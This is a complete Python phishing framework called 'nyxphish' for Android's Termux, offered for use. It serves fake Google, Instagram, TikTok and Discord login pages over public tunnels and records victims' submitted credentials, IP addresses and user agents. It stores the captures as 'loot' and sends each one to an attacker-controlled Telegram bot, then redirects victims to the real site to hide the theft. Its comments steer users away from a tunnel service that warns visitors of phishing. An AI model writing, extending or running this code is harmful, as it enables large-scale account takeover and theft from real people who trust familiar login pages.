#!/usr/bin/env python3
# nyxphish v3.0 — modern phishing framework for termux (2026)
# author: nyx | built for He
import os, sys, json, subprocess, threading, time, re, socket, itertools
from datetime import datetime

try:
    from flask import Flask, request, render_template_string, redirect, send_from_directory
    import requests
except ImportError:
    print("[!] missing deps. run: bash install.sh")
    sys.exit(1)

app = Flask(__name__)
import logging
logging.getLogger('werkzeug').setLevel(logging.ERROR)  # silence flask spam

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOOT_DIR = os.path.join(BASE_DIR, "captured")
SITE_DIR = os.path.join(BASE_DIR, "sites")
CONF_FILE = os.path.join(BASE_DIR, "config.json")
os.makedirs(LOOT_DIR, exist_ok=True)

# ---------- colors ----------
R  = "\033[1;31m"; G = "\033[1;32m"; Y = "\033[1;33m"
C  = "\033[1;36m"; W = "\033[1;37m"; M = "\033[1;35m"
B  = "\033[1;34m"; D = "\033[2m";    N = "\033[0m"

# ---------- live state ----------
STATE = {
    "captures": 0,
    "tunnel_url": None,
    "site": None,
    "start_time": None,
    "last_hit": None,
}
SPINNER_DONE = threading.Event()

BANNER_LINES = [
    " ███╗   ██╗██╗   ██╗██╗  ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗",
    " ████╗  ██║╚██╗ ██╔╝╚██╗██╔╝██╔══██╗██║  ██║██║██╔════╝██║  ██║",
    " ██╔██╗ ██║ ╚████╔╝  ╚███╔╝ ██████╔╝███████║██║███████╗███████║",
    " ██║╚██╗██║  ╚██╔╝   ██╔██╗ ██╔═══╝ ██╔══██║██║╚════██║██╔══██║",
    " ██║ ╚████║   ██║   ██╔╝ ██╗██║     ██║  ██║██║███████║██║  ██║",
    " ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝",
]
# gradient: cyan → blue → magenta sweep
GRAD = ["\033[38;5;51m", "\033[38;5;45m", "\033[38;5;39m",
        "\033[38;5;75m", "\033[38;5;69m", "\033[38;5;63m"]

def banner():
    out = []
    for i, line in enumerate(BANNER_LINES):
        out.append(GRAD[i % len(GRAD)] + line + N)
    out.append(f"{W}        v3.3 {D}— termux edition{N} {M}|{N} {C}multi-tunnel{N} {M}|{N} {C}tg exfil{N} {M}|{N} {C}live stats{N}")
    return "\n".join(out)

SITES = ["google", "instagram", "tiktok", "discord"]
SITE_ICONS = {"google": "G", "instagram": "◉", "tiktok": "♪", "discord": "◆"}
REAL_REDIRECTS = {
    "google":    "https://accounts.google.com",
    "instagram": "https://www.instagram.com",
    "tiktok":    "https://www.tiktok.com/login",
    "discord":   "https://discord.com/login",
}

# ---------- ui helpers ----------
def box(title, lines, color=C):
    width = max(len(re.sub(r'\033\[[0-9;]*m', '', l)) for l in lines + [title]) + 4
    width = max(width, 48)
    print(f"{color}┌{'─'*width}┐{N}")
    print(f"{color}│{N} {W}{title.center(width-2)}{N} {color}│{N}")
    print(f"{color}├{'─'*width}┤{N}")
    for l in lines:
        pad = width - 2 - len(re.sub(r'\033\[[0-9;]*m', '', l))
        print(f"{color}│{N} {l}{' '*max(pad,0)} {color}│{N}")
    print(f"{color}└{'─'*width}┘{N}")

def spinner(text, done_event):
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    for f in itertools.cycle(frames):
        if done_event.is_set():
            break
        sys.stdout.write(f"\r{C}{f}{N} {text}")
        sys.stdout.flush()
        time.sleep(0.08)
    sys.stdout.write("\r" + " "*(len(text)+4) + "\r")
    sys.stdout.flush()

def typewrite(text, delay=0.02):
    for ch in text:
        sys.stdout.write(ch); sys.stdout.flush()
        time.sleep(delay)
    print()

def uptime():
    if not STATE["start_time"]:
        return "0s"
    s = int(time.time() - STATE["start_time"])
    return f"{s//3600}h {(s%3600)//60}m {s%60}s" if s >= 3600 else (f"{s//60}m {s%60}s" if s >= 60 else f"{s}s")

def status_bar():
    cap = STATE["captures"]
    cap_str = f"{G}{cap}{N}" if cap > 0 else f"{D}0{N}"
    url = STATE["tunnel_url"] or "—"
    print(f"\n{D}{'─'*58}{N}")
    print(f" {M}◈{N} status  {D}|{N}  target: {W}{STATE['site'] or '—'}{N}  "
          f"{D}|{N}  hits: {cap_str}  {D}|{N}  uptime: {W}{uptime()}{N}")
    print(f" {M}◈{N} tunnel  {D}|{N}  {C}{url}{N}")
    print(f"{D}{'─'*58}{N}")

def hit_alert(creds):
    print(f"\a", end="")  # terminal bell
    lines = []
    for k, v in creds.items():
        icon = "◆" if k in ("password", "pass") else ("●" if k in ("email","username") else "○")
        vc = f"{R}{W}{v}{N}" if k in ("password", "pass") else f"{W}{v}{N}"
        lines.append(f"{M}{icon}{N} {C}{k:>9}{N} {D}→{N} {vc}")
    box(f" CREDENTIALS CAPTURED — {creds['site'].upper()} ", lines, G)
    print(f"{Y}[*] still listening... next victim pls{N}\n")

# ---------- config (telegram) ----------
def load_config():
    if os.path.exists(CONF_FILE):
        with open(CONF_FILE) as f:
            return json.load(f)
    return {"tg_token": "", "tg_chatid": ""}

def save_config(cfg):
    with open(CONF_FILE, "w") as f:
        json.dump(cfg, f, indent=2)

def setup_telegram():
    cfg = load_config()
    print(f"\n{Y}[*] telegram exfil setup {D}(leave blank to keep current){N}")
    token = input(f"{W}[?] bot token {D}[{cfg['tg_token'][:10] + '...' if cfg['tg_token'] else 'none'}]{N} > ").strip()
    chatid = input(f"{W}[?] chat id   {D}[{cfg['tg_chatid'] or 'none'}]{N} > ").strip()
    if token:  cfg["tg_token"] = token
    if chatid: cfg["tg_chatid"] = chatid
    save_config(cfg)
    done = threading.Event()
    t = threading.Thread(target=spinner, args=("verifying bot token...", done), daemon=True)
    t.start()
    ok = False
    if cfg["tg_token"]:
        try:
            r = requests.get(f"https://api.telegram.org/bot{cfg['tg_token']}/getMe", timeout=8)
            ok = r.ok
        except Exception:
            pass
    done.set(); t.join()
    if ok:
        print(f"{G}[+] config saved — bot verified and ready{N}\n")
    else:
        print(f"{Y}[+] config saved {D}(bot not verified — check token if exfil fails){N}\n")
    time.sleep(1)

def telegram_exfil(data):
    cfg = load_config()
    if not cfg["tg_token"] or not cfg["tg_chatid"]:
        return
    try:
        pretty = json.dumps(data, indent=2)
        msg = f"🎯 *NYXPHISH HIT* #{STATE['captures']}\n\n```json\n{pretty}\n```"
        requests.post(
            f"https://api.telegram.org/bot{cfg['tg_token']}/sendMessage",
            json={"chat_id": cfg["tg_chatid"], "text": msg,
                  "parse_mode": "Markdown"}, timeout=10)
    except Exception:
        pass

# ---------- flask routes ----------
@app.route("/", methods=["GET", "POST"])
def index():
    site = app.config["SITE"]
    if request.method == "POST":
        creds = {
            "site": site,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": request.headers.get("X-Forwarded-For", request.remote_addr),
            "ua": request.headers.get("User-Agent", "unknown"),
            **dict(request.form)
        }
        STATE["captures"] += 1
        STATE["last_hit"] = creds
        logfile = os.path.join(LOOT_DIR, f"{site}_{int(time.time())}.json")
        with open(logfile, "w") as f:
            json.dump(creds, f, indent=2)
        hit_alert(creds)
        status_bar()
        telegram_exfil(creds)
        return redirect(REAL_REDIRECTS.get(site, "https://google.com"))
    with open(os.path.join(SITE_DIR, site, "index.html")) as f:
        return render_template_string(f.read())

@app.route("/<path:filename>")
def assets(filename):
    # serve css/js/images/fonts from the active template dir
    site_dir = os.path.join(SITE_DIR, app.config["SITE"])
    if os.path.exists(os.path.join(site_dir, filename)):
        return send_from_directory(site_dir, filename)
    return redirect("/")

# ---------- tunneling ----------
# backends ranked by 2026 reliability research (tested live):
#   cloudflared  — zero interstitial, serves pages raw. BEST.
#   localhost.run— ssh-based, no binary needed, but free tier is flaky
#   localtunnel  — shows phishing interstitial asking victim's IP. AVOID.
TUNNEL_BACKENDS = ["cloudflared", "localhost.run", "localtunnel"]

def tunnel_cmd(backend, port):
    """build command for a backend, or None if not available"""
    import shutil
    if backend == "cloudflared":
        local = os.path.join(BASE_DIR, "cloudflared")
        bin_ = local if os.path.exists(local) else shutil.which("cloudflared")
        if not bin_:
            bin_ = "/data/data/com.termux/files/usr/bin/cloudflared"
        if os.path.exists(bin_):
            return [bin_, "tunnel", "--url", f"http://localhost:{port}",
                    "--no-autoupdate"]
    elif backend == "localhost.run":
        ssh = shutil.which("ssh") or "/data/data/com.termux/files/usr/bin/ssh"
        if os.path.exists(ssh):
            return [ssh, "-R", f"80:localhost:{port}", "nokey@localhost.run",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "ServerAliveInterval=30",
                    "-o", "BatchMode=yes"]
    elif backend == "localtunnel":
        node = shutil.which("node") or "/data/data/com.termux/files/usr/bin/node"
        script = os.path.join(BASE_DIR, "nyxtunnel.js")
        if os.path.exists(node) and os.path.exists(script):
            return [node, script, str(port)]
    return None

URL_PATTERNS = [
    # negative lookahead: cloudflared logs its control endpoint
    # "api.trycloudflare.com" during startup — that is NOT your tunnel
    r"https://(?!api\.)[-a-z0-9]+\.trycloudflare\.com",
    r"https://(?!admin\.)[-a-z0-9]+\.lhr\.life",
    r"https://[a-z0-9-]+\.loca\.lt",
    # some termux cloudflared builds print the bare host, no scheme
    r"(?<![/.-])\b(?!api\.)[-a-z0-9]{4,}\.trycloudflare\.com\b",
]

def spawn_tunnel(backend, port):
    """try one backend, return url or None"""
    cmd = tunnel_cmd(backend, port)
    if not cmd:
        return None, "not installed"
    done = threading.Event()
    t = threading.Thread(target=spinner,
                         args=(f"trying {backend} on :{port}...", done),
                         daemon=True)
    t.start()
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        done.set(); t.join()
        return None, str(e)
    url_found = None
    raw = []
    start = time.time()
    while time.time() - start < 90:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                raw.append(f"[process exited with code {proc.returncode}]")
                break
            continue
        raw.append(line.rstrip())
        for pat in URL_PATTERNS:
            m = re.search(pat, line)
            if m:
                url_found = m.group(0)
                if not url_found.startswith("http"):
                    url_found = "https://" + url_found
                break
        if url_found:
            break
    done.set(); t.join()
    if not url_found:
        proc.terminate()
        # save raw output for debugging — this is gold on weird devices
        dbg = os.path.join(BASE_DIR, "tunnel_debug.log")
        with open(dbg, "a") as f:
            f.write(f"\n===== {backend} @ {datetime.now()} =====\n")
            f.write("cmd: " + " ".join(cmd) + "\n")
            f.write("\n".join(raw[-25:]) + "\n")
        tail = " | ".join(l.strip()[:80] for l in raw[-3:] if l.strip())
        return None, f"timeout/no url (debug saved to tunnel_debug.log){' — last: ' + tail if tail else ''}"
    return url_found, proc

def start_tunnel(port):
    chosen = None
    url = None
    proc = None
    attempts = {"cloudflared": 3, "localhost.run": 2, "localtunnel": 1}
    for backend in TUNNEL_BACKENDS:
        for attempt in range(attempts.get(backend, 1)):
            if attempt > 0:
                print(f"{D}    {backend}: retry {attempt+1}/{attempts[backend]}...{N}")
                time.sleep(3)
            url, result = spawn_tunnel(backend, port)
            if url:
                chosen = backend
                proc = result
                break
            else:
                print(f"{D}    {backend}: {result}{N}")
        if url:
            break
    if not url:
        print(f"\n{R}[!] all tunnel backends failed.{N}")
        print(f"{Y}    quick fixes to try:{N}")
        print(f"    1. toggle airplane mode / switch wifi ↔ mobile data")
        print(f"    2. {W}pkg install resolv-conf{N} then restart termux (dns fix)")
        print(f"    3. just run it again — quick tunnels fail randomly sometimes")
        print(f"    4. full log: {W}cat tunnel_debug.log{N}")
        sys.exit(1)

    STATE["tunnel_url"] = url
    STATE["backend"] = chosen
    typewrite(f"{G}[+] tunnel established via {chosen}{N}", 0.015)
    print(f"\n  {W}🎣 send this:{N}  {C}{W}{url}{N}")
    try:
        import qrcode
        qr = qrcode.QRCode(border=1)
        qr.add_data(url); qr.make()
        print(f"\n{D}  scan to open:{N}")
        qr.print_ascii(invert=True)
    except ImportError:
        pass
    print(f"\n{Y}[*] waiting for victims... {D}(ctrl+c to stop){N}")

# ---------- helpers ----------
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def view_loot():
    files = sorted(os.listdir(LOOT_DIR))
    print()
    if not files:
        print(f"{Y}[*] no captures yet — go get some{N}\n"); time.sleep(1.5); return
    print(f"{C}[*] {len(files)} capture(s) on disk:{N}\n")
    for fn in files:
        with open(os.path.join(LOOT_DIR, fn)) as f:
            data = json.load(f)
        lines = [f"{C}{k:>9}{N} {D}→{N} {W}{v}{N}" for k, v in data.items()]
        box(fn, lines, M)
    input(f"\n{D}press enter to return...{N}")

# ---------- main menu ----------
def menu_screen():
    os.system("clear")
    print(banner())
    cfg = load_config()
    tg = f"{G}configured{N}" if cfg["tg_token"] else f"{D}not set{N}"
    loot_n = len(os.listdir(LOOT_DIR))
    print(f"\n {D}telegram:{N} {tg}   {D}loot on disk:{N} {W}{loot_n}{N}   {D}templates:{N} {W}{len(SITES)}{N}\n")
    print(f"  {C}┌─────────────────────────────┐{N}")
    print(f"  {C}│{N}  {W}[1]{N} 🎣 start phishing        {C}│{N}")
    print(f"  {C}│{N}  {W}[2]{N} 🤖 telegram config       {C}│{N}")
    print(f"  {C}│{N}  {W}[3]{N} 💰 view captured loot    {C}│{N}")
    print(f"  {C}│{N}  {W}[0]{N} 👋 exit                  {C}│{N}")
    print(f"  {C}└─────────────────────────────┘{N}\n")
    return input(f"{Y}[?] select > {N}").strip()

def template_picker():
    print(f"\n{C}[*] choose your bait:{N}\n")
    for i, s in enumerate(SITES, 1):
        print(f"  {W}[{i}]{N} {SITE_ICONS.get(s,'○')} {s}")
    print(f"\n  {D}[b] back{N}")
    return input(f"\n{Y}[?] select template > {N}").strip()

def main():
    while True:
        opt = menu_screen()
        if opt == "2":
            setup_telegram(); continue
        if opt == "3":
            view_loot(); continue
        if opt == "0":
            print(f"\n{M}[*] nyx out. happy hunting.{N}\n")
            sys.exit(0)
        if opt != "1":
            continue
        choice = template_picker()
        if choice.lower() == "b":
            continue
        try:
            site = SITES[int(choice) - 1]
        except (ValueError, IndexError):
            print(f"{R}[!] invalid choice{N}"); time.sleep(1); continue

        app.config["SITE"] = site
        STATE["site"] = site
        STATE["captures"] = 0
        STATE["tunnel_url"] = None
        STATE["start_time"] = time.time()
        port = 8080

        os.system("clear")
        print(banner())
        print()
        done = threading.Event()
        t = threading.Thread(target=spinner, args=(f"booting {site} server on 127.0.0.1:{port}...", done), daemon=True)
        t.start()
        threading.Thread(
            target=lambda: app.run(host="127.0.0.1", port=port,
                                   debug=False, use_reloader=False),
            daemon=True).start()
        time.sleep(1.5)
        done.set(); t.join()
        typewrite(f"{G}[+] server online{N}", 0.015)
        print(f"  {D}local:{N}  http://127.0.0.1:{port}")
        print(f"  {D}lan:{N}    http://{local_ip()}:{port}\n")
        start_tunnel(port)
        status_bar()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n\n{Y}[*] session ended. {STATE['captures']} capture(s) saved in ./captured/{N}")
            input(f"{D}press enter to return to menu...{N}")

if __name__ == "__main__":
    main()
